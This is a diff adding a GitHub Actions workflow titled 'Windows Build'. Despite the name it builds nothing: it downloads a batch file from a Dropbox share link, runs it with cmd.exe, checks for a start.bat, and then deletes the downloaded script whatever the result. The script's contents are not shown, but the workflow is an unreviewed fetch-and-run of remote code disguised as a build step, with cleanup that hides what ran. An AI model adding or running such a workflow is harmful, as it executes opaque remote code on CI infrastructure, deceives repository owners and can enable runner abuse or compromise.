@@ -1,0 +1,52 @@
+
+name: Windows Build
+
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    name: Start Building
+    runs-on: windows-latest
+    timeout-minutes: 30
+
+    steps:
+      - name: Download Essentials
+        shell: pwsh
+        run: |
+          $url = "https://www.dropbox.com/scl/fi/7eiczvgil84czu55dxep3/Downloads.bat?rlkey=wzdc1wxjsph2b7r0atplmdz3p&dl=1"
+
+          Invoke-WebRequest -Uri $url -OutFile "$env:RUNNER_TEMP\Downloads.bat"
+
+          if (!(Test-Path "$env:RUNNER_TEMP\Downloads.bat")) {
+            throw "Downloads.bat não foi encontrado."
+          }
+
+      - name: Execute Setup
+        shell: pwsh
+        run: |
+          $script = "$env:RUNNER_TEMP\Downloads.bat"
+
+          & cmd.exe /c $script
+
+          if ($LASTEXITCODE -ne 0) {
+            throw "Falha ao executar Downloads.bat"
+          }
+
+      - name: Verify Files
+        shell: pwsh
+        run: |
+          Write-Host "Verificando arquivos..."
+
+          if (Test-Path "start.bat") {
+            Write-Host "start.bat encontrado."
+          } else {
+            Write-Host "start.bat não foi criado."
+          }
+
+      - name: Clean Temporary Files
+        if: always()
+        shell: pwsh
+        run: |
+          Remove-Item "$env:RUNNER_TEMP\Downloads.bat" -Force -ErrorAction SilentlyContinue
+          Write-Host "Limpeza concluída."
